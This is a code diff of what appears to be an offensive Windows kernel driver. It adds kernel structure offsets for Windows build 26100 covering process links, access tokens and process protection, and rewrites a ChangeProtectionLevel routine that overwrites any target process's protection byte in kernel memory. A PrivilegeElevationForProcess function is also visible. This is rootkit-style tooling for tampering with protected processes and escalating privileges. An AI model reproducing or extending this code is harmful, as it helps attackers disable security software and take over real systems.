@@ -173,6 +173,12 @@ DWORD InitializeOffsets(Phooklist hooklist) {
         eoffsets.Token_offset = 0x4B8;
         eoffsets.protection_offset = 0x87A;
     }
+    else if (pversion.dwBuildNumber == 26100)
+    {
+        eoffsets.ActiveProcessLinks_offset = 0x1d8;
+        eoffsets.Token_offset = 0x248;
+        eoffsets.protection_offset = 0x5fa;
+    }
 
     if (eoffsets.ActiveProcessLinks_offset && eoffsets.Token_offset && eoffsets.protection_offset) {
         xHooklist.check_off = 0;
@@ -284,13 +290,14 @@ DWORD PrivilegeElevationForProcess(int pid)
 }
 
 
-
-DWORD
-ChangeProtectionLevel(int pid, BYTE protectionOption)
+NTSTATUS
+ChangeProtectionLevel(
+    PCR_SET_PROTECTION_LEVEL ProtectionLevel
+)
 {
     PVOID process = NULL;
-
-    NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, &process);
+    PPS_PROTECTION Protection;
+    NTSTATUS ret = PsLookupProcessByProcessId(ProtectionLevel->Process, &process);
 
     if (ret != STATUS_SUCCESS)
     {
@@ -305,16 +312,9 @@ ChangeProtectionLevel(int pid, BYTE protectionOption)
         return (-1);
     }
 
-    ULONG_PTR EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
+    PPS_PROTECTION EProtectionLevel = (ULONG_PTR)process + eoffsets.protection_offset;
 
-    if (*(BYTE*)EProtectionLevel == protectionOption)
-    {
-        DbgPrint("Protection Level is already set !!");
-
-        return (0);
-    }
-
-    *(BYTE*)EProtectionLevel = protectionOption;
+    *EProtectionLevel = ProtectionLevel->Protection;
 
     return (0);
 }
